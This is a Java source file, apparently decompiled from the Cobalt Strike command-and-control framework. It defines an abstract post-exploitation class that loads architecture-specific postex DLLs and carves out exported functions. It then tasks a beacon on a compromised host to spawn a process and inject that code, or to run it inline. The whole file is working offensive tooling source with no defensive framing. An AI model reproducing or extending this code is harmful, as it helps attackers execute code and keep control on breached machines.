package beacon;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.BeaconEntry;
import common.CommonUtils;
import common.SleevedResource;
import pe.PEParser;

public abstract class PostExInline {
    protected AggressorClient client;

    public String arch(String string) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.client.getData(), string);
        return (beaconEntry != null) ? beaconEntry.arch() : "x86";
    }

    public PostExInline(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public String getFile(String string) {
        if ("x86".equals(string))
            return "resources/postex.dll";
        if ("x64".equals(string))
            return "resources/postex.x64.dll";
        throw new RuntimeException("unknown arch.");
    }

    public byte[] getArguments() {
        return new byte[0];
    }

    public abstract String getFunction();

    public void spawnAndInject(String string) {
        String str1 = arch(string);
        CommandBuilder commandBuilder = new CommandBuilder();
        if ("x64".equals(str1)) {
            commandBuilder.setCommand(97);
        } else {
            commandBuilder.setCommand(96);
        }
        String str2 = getFunction();
        if ("x86".equals(str1))
            str2 = "_" + str2 + "@4";
        byte[] arrby1 = SleevedResource.readResource(getFile(str1));
        PEParser pEParser = PEParser.load(arrby1);
        byte[] arrby2 = pEParser.carveExportedFunction(str2);
        commandBuilder.addLengthAndString(arrby2);
        commandBuilder.addLengthAndString(getArguments());
        this.client.getConnection().call("beacons.task", CommonUtils.args(string, commandBuilder.build()));
    }

    public void go(String string) {
        String str1 = arch(string);
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(95);
        String str2 = getFunction();
        if ("x86".equals(str1))
            str2 = "_" + str2 + "@4";
        byte[] arrby1 = SleevedResource.readResource(getFile(str1));
        PEParser pEParser = PEParser.load(arrby1);
        byte[] arrby2 = pEParser.carveExportedFunction(str2);
        commandBuilder.addLengthAndString(getArguments());
        commandBuilder.addString(arrby2);
        this.client.getConnection().call("beacons.task", CommonUtils.args(string, commandBuilder.build()));
    }
}
